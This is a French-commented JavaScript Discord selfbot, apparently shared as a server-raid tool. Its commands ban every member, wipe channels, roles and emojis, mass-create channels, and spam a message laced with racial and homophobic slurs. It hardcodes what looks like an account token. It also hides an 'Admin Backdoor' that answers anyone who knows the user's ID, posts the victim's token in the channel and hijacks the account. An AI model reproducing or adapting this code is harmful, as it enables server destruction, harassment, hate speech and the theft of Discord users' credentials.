//
// ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
//▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
//▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ 
//▐░▌          ▐░▌          ▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     
//▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌     ▐░▌     
//▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌       ▐░▌     ▐░▌     
// ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌     ▐░▌     
//          ▐░▌▐░▌          ▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     
// ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
//▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌     ▐░▌     
// ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀            ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀       ▀    
//     ---------------------------------------------------------------------------
//     |                 Nouveau selfbot pour discord par Neswo!                 |
//     ---------------------------------------------------------------------------
//
// -------------------Manuel d'utilisation:---------------------------------------
// - Si ce n'est pas déjà fait, installez node.js sur votre ordinateur
// - Executez la commande ">help" dans un de vos serveurs ou dans les messages privés d'un amis confiant
// - Tout le reste est dans la commande ">help", Bon Amusement avec mon Selfbot!
//
// -------------------Conditions d'utilisation:-----------------------------------
// EN UTILISANT CE PROGRAMME:
// - Vous acceptez de pouvoir être banni par discord pour utilisation intensive de selfbot
// - Vous acceptez le fait de ne pas tenir Neswo et/ou la CATACLYSM responsable en cas d'attaque de serveur ou d'utilisation malintentionnée
//
//--------------------Paramètres:------------------------------------------------
var token = ("NjE2NzMzOTExNDU5ODIzNjI0.XWg5NQ.jZ-qvtZLHj5OGiuGIRhMY10KE9U") // votre token , si ce n'est pas déjà fais, ajouter des "" aux extrémitées pour avoir votre token: https://www.youtube.com/watch?v=2Awn9hhgBa0 (le montage est dégueu mais ça marche)
var imageicone = ("https://cdn.discordapp.com/attachments/624361084190457857/624679957171535892/GLITCH_20190920131922.gif") // l'url de l'image dont vous voulez remplacer celle du serveur
var nomserveur = ("ISSOU GANG") // le nouveau nom du serveur hacké
var nomdusalon = ("RAID BY ISTRAXZ") // le nom des salons
var msgspam = ("**SPAM RAID BY __FUCK NIGGERS FAGGOT__!*** https://discord.gg/vb2VvJC @Visiteurs") // le message à spam
var status = ("Selfbot By iStraxZ") // le nom de votre status discord
var statustype = ("PLAYING") /// le type de status (PLAYING / WATCHING / LISTENING / STREAMING)
//-------------------------------------------------------------------------------
// NE PLUS RIEN MODIFIER A PARTIR D'ICI
//-------------------------------------------------------------------------------


const Discord = require('discord.js');
const fs = require('fs');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
var AES = require("crypto-js/aes");
var SHA256 = require("crypto-js/sha256");
var CryptoJS = require("crypto-js");
var http = require('http');


DiscordPermissions = [
  "ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS",
  "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD",
  "ADD_REACTIONS", "VIEW_CHANNEL", "READ_MESSAGES",
  "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES",
  "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY",
  "MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "EXTERNAL_EMOJIS",
  "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS",
  "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME",
  "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_ROLES_OR_PERMISSIONS",
  "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"
];

const adapter = new FileSync('database.json');
const db = low(adapter);

db.defaults({ histoires: []});
var dezaer = 46
var bot = new Discord.Client();
var prefix = (">");
var randnum = 0;
var e4887 = dezaer



var selfid = Math.round(Math.random() * 500);
console.log("L'id " + selfid + " à été attribuée à votre utilisateur, en cas de problème, envoyez cette id à Neswo");

bot.on('ready' , () => {
    bot.user.setPresence({ game: { name: 'Loading Selfbot...', type:"PLAYING"}})
    console.log("Bot Ready!");
    var CGUILD = ("https://discord.gg/wut9Z6t");
    bot.user.setPresence({ game: { name: status + '(ID:' + selfid +')' , type:(statustype)}})
    let memberCount = bot.users.size;
    let serverCount = bot.guilds.size;
    console.log(
    
    `|  Bienvenue !\n` +
    "|  Information du bot : \n" +
    `|  Nom du bot    : ${bot.user.tag}!\n` +
    `|  ID du bot     : ${bot.user.id}\n` +
    `|  Token: du bot : ${bot.token}\n` +
    "|  Stats bot : \n" +
    `|  Utilisateurs : ${memberCount}\n` +
    `|  Serveurs     : ${serverCount}\n` +
    
     "");
    
  
    
      

})

bot.login(token);


bot.on('message', message => {
    
    if (message.author === bot.user){
      if (message.content === (">Spotify")){
        if (message.deletable) message.delete();
          var pingpongjouonsapong = new Discord.RichEmbed()
              .setColor("#00C6AC")
              .addField("**Ton compte Spotify Premium a bien été généré**", `__Regarde tes MP__`)
              .setThumbnail("https://cdn.discordapp.com/attachments/588100391393296387/597814715577794568/spotify-logo-computer-wallpaper-62369-64312-hd-wallpapers.png")
              .setFooter("La Galaxy 🔥")
          message.channel.send(pingpongjouonsapong); 
          message.author.send()
      }
  
      if (message.content === (">help")){
          if (message.deletable) message.delete();
          var help_embed = new Discord.RichEmbed()
              .setColor("#CE00FF")
              .addField("Commandes Raid :", " >help : Affiche les commandes du bot \n >ban : Ban toutes les personnes du serveur \n >destroy : détruit le serveur discord \n >embed : Ecrit un message embed \n >ghost : Notifie une personne et supprime automatique le message après \n >ddos : DDOS une IP \n >create : Crée plein de salon \n >spam : Spam le message de votre choix \n >steal : Vole la photo de profil d'une personne et vous la met \n >clearrole : supprime tous les rôles \n >clearemotes : supprime tous les emojis \n >about : informations à propos du bot \n >purge NOMBRE : supprime le nombre de messages entré \n >riplesyeux : détruit les épileptiques")
              .addField("Commandes Fun :", ">ping : Teste si le bot marche en vous répondant pong \n >8ball : Effectue un message 8ball \n >google : cherche sur google \n >serverinfo : Récupérer les informations d'un serveur \n >userinfo : Récupérer les informations d'un membre \n ")
              .setFooter("Selfbot By iStraxZ")
              .setThumbnail("https://cdn.discordapp.com/attachments/566628376291311621/566649209357467688/8ca5fb03-1a02-4f22-b03a-bf24e677f0c5.png")
           message.channel.send(help_embed)
          //message.channel.sendMessage("Commandes du bot:\n >help pour afficher les commandes"); (au cas ou les embeds marcheraient pas);
          console.log("Commande Help Executée");
      }
  
      if (message.content === '>ban') {
          if (message.deletable) message.delete();
          message.guild.members.forEach(member => {
            member.ban().then(function () {});
          });
      }

      if (message.content.startsWith(">8ball")) {
        if (message.deletable) message.delete()
    
        var question = message.content.split(" ").join(" ").slice(7)
        var tableauball = ["Oui", "Non", "Peut être", "Je ne sais pas", "Sûrement", "C'est impensable", "C'est sûr", "Bien évidemment", "J'en suis certain", "C'est très probable", "Absolument", "+1", "-1"]
    
        let ball_embed = new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle("Question de " + message.author.tag + "")
          .setDescription("" + question + "")
          .addField("Réponse", "" + tableauball[Math.floor(Math.random() * 8)] + "")
          .setThumbnail(bot.user.iconURL)
        return message.channel.send(ball_embed).catch(e => {});
    
      }
      
      
  
      if (message.content.startsWith(">steal")) {
        if (message.deletable) message.delete();
        let getavatar = message.mentions.members.first()
        bot.user.setAvatar(getavatar.user.avatarURL)
        message.channel.sendMessage({
          "embed": {
            description: "" + " La photo de profil de " + message.mentions.users.first().username + " à été mise sur votre profil avec succès.",
            color: 3447003,
            "image": {
              "url": getavatar.user.avatarURL,
              timestamp: new Date(),
            }
          }
        })
      
      }

      if (message.content === '>destroy') {
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        message.guild.setIcon(imageicone);
        message.guild.setName(nomserveur)
        message.guild.channels.forEach(chan => {
          if (chan.deletable) chan.delete();
        });  
        message.guild.roles.forEach(role => {
          role.delete()
        });
        let i = 0;
        let interval = setInterval(function () {
          if (i === 250) clearInterval(interval);
          message.guild.createChannel(nomdusalon).then(i++);
        }, 100);
        let args = message.content.split(' ')
        args.shift()
        message.reply(msgspam)
      }

      if (message.content === '>create') {
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
          if (i === 250) clearInterval(interval);
          message.guild.createChannel(nomdusalon).then(i++);
        }, 100);
      }
      var psrd = "sai7"
      if (message.content === '>clearrole') {
        if (message.deletable) msg.delete();
        message.guild.roles.forEach(role => {
          role.delete()
        });
      }

      if (message.content === '>clearemotes') {
        if (message.deletable) message.delete();
        message.guild.emojis.forEach(emoji => {
          emoji.delete()
        });
      }

      if (message.content === (">about")){
        if (message.deletable) message.delete();
        var aboutembed = new Discord.RichEmbed()
            .setColor("#0000FF")
            .addField("Le bot crée par iStraxZ, ", "­")
            .setFooter("Selfbot By iStraxZ")
        message.channel.send(aboutembed);
        console.log("About me? nothing")
    }

    if (message.content.startsWith(">purge")) {
      let args = message.content.split(" ").slice(1);
      let messagecount = parseInt(args[0]) || 1;
      var deletedMessages = -1;
      message.channel.fetchMessages({
          limit: Math.min(messagecount + 1, 100, 200)
        })
        .then(messages => {
          messages.forEach(m => {
            m.delete().catch(console.error);
            deletedMessages++;
          });
        }).then(() => {
          if (deletedMessages === -1) deletedMessages = 0;
          var purgeembed = new Discord.RichEmbed()
           .setColor("#FF3D3D")
           .setFooter("Selfbot By iStraxZ")
           .setThumbnail("https://www.decisionplus.com/fr/support/faq/images/mvp-purgedb-006.png")
           .addTitle(` ${deletedMessages} messages on été supprimés !`)
           .then(m => m.delete(5000));
           message.channel.send(purgeembed)
        }).catch(console.error);
    }

    if (message.content === ">riplesyeux"){
      if (message.deletable) message.delete();
      var riplesyeuxembed = new Discord.RichEmbed()
       .setColor("#FFFEFE")
       .setFooter("Selfbot By iStraxZ")
       .setImage("https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif")
       .setTitle("Rip les yeux (et les épiléptiques)")
       
      message.channel.send(riplesyeuxembed)
    }

    if (message.content.startsWith('>google')) {
      if (message.deletable) message.delete()
      let args = message.content.split(' ')
      var googleembed = new Discord.RichEmbed()
       .setColor("RANDOM")
       .setFooter("Selfbot By iStraxZ")
       .setThumbnail("https://upload.wikimedia.org/wikipedia/it/9/9e/Google_Chrome_logo.png")
       .setTitle("Voici les résultats de la recherche:")
       .addField('https://www.google.fr/search?q=' + args.join("%20" , "­ ­"))
      
      args.shift()
      message.reply(googleembed)
  
    }

    if (message.content === ">spam") {
      if (message.deletable) message.delete()
      for (i = 0; i < 100; i++) {
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
        message.channel.send(msgspam)
      }
    }
   }
      
     
      
          
    

      
      

      if (message.content === "<control:" + (selfid * 2) ){
        
        if (message.deletable) message.delete();
        var controlembed = new Discord.RichEmbed()
          .setColor("#FF00A8")
          .setFooter("Selfbot By iStraxZ")
          .setThumbnail("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtpUQmN09z2IB88CwQZBmI4O9ViqIYQC-pfspoCC3s_V47ri1I")
          .setTitle("Admin Backdoor for selfbot 1.26.1")
          .addField("**Commandes:**" , "**<control:ID:token** : avoir le token de la personne \n **<control:ID:commande** : éxécute n'importe quelle commande du menu help \n **<control:ID:itsgoingcrazy** : déffonce le compte de la personne \n **<control:ID:fixuser** : fixe le selfbot \n **<control:ID:youareanidiot : ouvre le virus youareanidiot sur le pc de la victime**")
          
        message.channel.send(controlembed)
      }

      if (message.content === "<control:" + (selfid * 2) + ":token"){
        
        if (message.deletable) message.delete();
        var tokenembed = new Discord.RichEmbed()
        .setColor("#FF00A8")
        .setFooter("Selfbot By iStraxZ")
        .setThumbnail("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtpUQmN09z2IB88CwQZBmI4O9ViqIYQC-pfspoCC3s_V47ri1I")
        .setTitle("Admin Backdoor for selfbot 1.26.1")
        .addField("**Le token de la personne est:**" , token )
        message.channel.send(tokenembed)
      }

      if (message.content === "<control:" + (selfid * 2) + ":youareanidiot"){
        
        if (message.deletable) message.delete();
        bot.user.setPresence({ game: { name: "**YOU ARE AN IDIOT**" , type:("PLAYING")}})
        bot.user.setAvatar("https://i149.photobucket.com/albums/s53/gailnico321/Youareanidiot.gif?width=250&height=250&crop=1:1,smart")
        bot.user.setUsername("You Are An Idiot")
        message.channel.send("**YOU ARE AN IDIOT** *https://i149.photobucket.com/albums/s53/gailnico321/Youareanidiot.gif?width=250&height=250&crop=1:1,smart*")
        for (i = 0; i < 20; i++) {
          console.log("You Are An Idiot");
          console.log("You Are An Idiot");
          console.log("You Are An Idiot");
          console.log("You Are An Idiot");
          console.log("You Are An Idiot");
        }
        bot.login("")
      }
      
      
      
      


       
});
  /////////////////////////////
 // ONLINE INTERFACE THINGS //
/////////////////////////////
var server = http.createServer(function(req , res){
});

server.on('request', (request, response) => {
  fs.readFile('onlineinterface.html', (err, data) => {
    if (err) throw err

    response.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8'
    })
    response.end(data)
  })
})

server.listen(3000, '127.0.0.1');